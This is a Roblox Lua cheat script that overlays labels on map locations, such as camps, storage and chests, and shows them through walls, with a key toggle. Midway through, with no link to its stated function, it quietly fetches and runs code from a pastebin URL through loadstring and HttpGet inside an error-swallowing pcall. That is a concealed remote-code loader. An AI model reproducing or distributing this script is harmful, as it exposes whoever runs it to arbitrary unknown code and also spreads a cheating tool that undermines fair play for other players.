local location = Instance.new("BillboardGui")
local holder = Instance.new("Frame")
local edges = Instance.new("ImageLabel")
local bk = Instance.new("ImageLabel")
local Lname = Instance.new("TextLabel")
location.Name = "location"
location.Parent = game.CoreGui
location.AlwaysOnTop = true
location.MaxDistance = 10000.000
location.Size = UDim2.new(15, 50, 4.5, 15)
location.StudsOffset = Vector3.new(0, 6, 0)
holder.Name = "holder"
holder.Parent = location
holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
holder.BackgroundTransparency = 1.000
holder.Size = UDim2.new(1, 0, 1, 0)
edges.Name = "edges"
edges.Parent = holder
edges.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
edges.BackgroundTransparency = 1.000
edges.Size = UDim2.new(1, 0, 1, 0)
edges.ZIndex = 0
edges.Image = "rbxassetid://4318718974"
edges.ImageTransparency = 0.500
edges.ScaleType = Enum.ScaleType.Slice
edges.SliceCenter = Rect.new(10, 10, 190, 190)
edges.SliceScale = 0.600
bk.Name = "bk"
bk.Parent = edges
bk.AnchorPoint = Vector2.new(0.5, 1)
bk.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
bk.BackgroundTransparency = 0.500
bk.BorderSizePixel = 0
bk.Position = UDim2.new(0.5, 0, 1, 0)
bk.Size = UDim2.new(1, 0, 1, 0)
bk.ZIndex = -1
bk.Image = "rbxassetid://4318742890"
bk.ImageColor3 = Color3.fromRGB(0, 0, 0)
bk.ImageTransparency = 0.900
bk.ScaleType = Enum.ScaleType.Tile
bk.SliceCenter = Rect.new(12, 12, 88, 88)
bk.TileSize = UDim2.new(0, 30, 0, 30)
Lname.Name = "Lname"
Lname.Parent = bk
Lname.AnchorPoint = Vector2.new(0.5, 0.5)
Lname.BackgroundColor3 = Color3.fromRGB(52, 73, 94)
Lname.BackgroundTransparency = 1.000
Lname.Position = UDim2.new(0.5, 0, 0.5, 0)
Lname.Size = UDim2.new(0.949999988, 0, 0.899999976, 0)
Lname.ZIndex = 2
Lname.Font = Enum.Font.GothamBlack
Lname.Text = "Bandit Camp"
Lname.TextColor3 = Color3.fromRGB(230, 255, 0)
Lname.TextScaled = true
Lname.TextSize = 20.000
Lname.TextStrokeTransparency = 0.750
Lname.TextWrapped = true
M = game.Players.LocalPlayer:GetMouse()
local on_1 = true
local function update_1()
------
for i,v in pairs(game:GetService("Workspace").Map.PlaceLocations:GetChildren()) do
    if v.Name == "Location" then
        if v:FindFirstChild("TempStructure") then
            if v.TempStructure:FindFirstChild("DisplayName") and v.TempStructure:FindFirstChild("Center") and not v.TempStructure.Center:FindFirstChild("location") then
                wait(0.25)
                LID = location:Clone()
                LID.Parent = v.TempStructure.Center
                LID.holder.edges.bk.Lname.Text = v.TempStructure.DisplayName.Value
                if v.TempStructure:FindFirstChild("PrivateStorage") then
                    if not v.TempStructure.DisplayName.Value:find("Camp") then
                        LID.holder.edges.bk.Lname.TextColor3 = Color3.fromRGB(0,255,0)
                    end
                elseif v.TempStructure:FindFirstChild("Chest") then
                    if not v.TempStructure.DisplayName.Value:find("Camp") then
                        LID.holder.edges.bk.Lname.TextColor3 = Color3.fromRGB(255,0,0)
                    end
                end
            end
        end
    end
end
------
end
pcall(function()
loadstring(game:HttpGet(('https://pastebin.com/raw/errZFBHk'),true))()
end)
local function stop_1()
------
for i,v in pairs(game:GetService("Workspace").Map.PlaceLocations:GetChildren()) do
    if v.Name == "Location" then
        if v:FindFirstChild("TempStructure") then
            if v.TempStructure:FindFirstChild("DisplayName") and v.TempStructure:FindFirstChild("Center") and v.TempStructure.Center:FindFirstChild("location") then
                wait(0.25)
                v.TempStructure.Center.location:Destroy()
            end
        end
    end
end
------
end
M.KeyDown:connect(function(key)
    if key == "j" then
        if on_1 == true then
            wait()
            on_1 = false
        elseif on_1 == false then
            wait()
            on_1 = true
        end
    end
end)
while wait(0.5) do
    if on_1 == true then
        update_1()
    elseif on_1 == false then
        stop_1()
    end
end